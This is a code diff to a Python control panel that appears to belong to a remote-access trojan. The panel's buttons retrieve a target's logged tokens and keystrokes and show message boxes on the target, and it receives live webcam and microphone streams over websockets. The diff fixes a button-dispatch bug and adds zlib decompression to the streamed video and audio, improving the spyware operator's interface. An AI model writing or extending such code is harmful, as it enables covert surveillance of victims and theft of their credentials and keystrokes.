@@ -7,7 +7,7 @@ from bit import SUPPORTED_CURRENCIES
 from win10toast import ToastNotifier
 from cryptography.fernet import Fernet
 from websocket import create_connection
-import multiprocessing, customtkinter, subprocess, websocket, threading, coincurve, requests, pyaudio, tkinter, shutil, base64, json, fade, time, glob, cv2, ssl, os, io
+import multiprocessing, customtkinter, subprocess, websocket, threading, coincurve, requests, pyaudio, tkinter, shutil, base64, json, fade, time, glob, zlib, cv2, ssl, os, io
 
 customtkinter.set_appearance_mode("dark")
 toaster = ToastNotifier()
@@ -150,7 +150,7 @@ class Controller(customtkinter.CTkFrame):
                         text_color="white"
                     )
 
-                elif count == "Show Message Box":
+                elif command == "Show Message Box":
                     btn = customtkinter.CTkButton(
                         frame, text=button_name, 
                         command=lambda: self.get_message_box(target), 
@@ -158,7 +158,7 @@ class Controller(customtkinter.CTkFrame):
                         text_color="white"
                     )
 
-                elif count == "Logged Tokens":
+                elif command == "Logged Tokens":
                     btn = customtkinter.CTkButton(
                         frame, text=button_name, 
                         command=self.download_tokens, 
@@ -166,7 +166,7 @@ class Controller(customtkinter.CTkFrame):
                         text_color="white"
                     )
 
-                elif count == "Logged Keystrokes":
+                elif command == "Logged Keystrokes":
                     btn = customtkinter.CTkButton(
                         frame, text=button_name, 
                         command=self.download_keylogs, 
@@ -368,10 +368,12 @@ class Video(customtkinter.CTkFrame):
         while True:
             try:
                 recv_data = ws.recv()
-                data = base64.b64decode(recv_data)
+                data = zlib.decompress(base64.b64decode(recv_data))
             except (websocket.WebSocketException, ValueError, NameError) as e:
                 ws = self.connect()
                 continue
+
+            print(data)
 
             self.image = Image.open(io.BytesIO(data))
 
@@ -442,7 +444,7 @@ class Audio(customtkinter.CTkFrame):
         
         while not self.stop:
             try:
-                stream.write(base64.b64decode(ws.recv()))
+                stream.write(zlib.decompress(base64.b64decode(ws.recv())))
             except:
                 ws = self.connect()
 
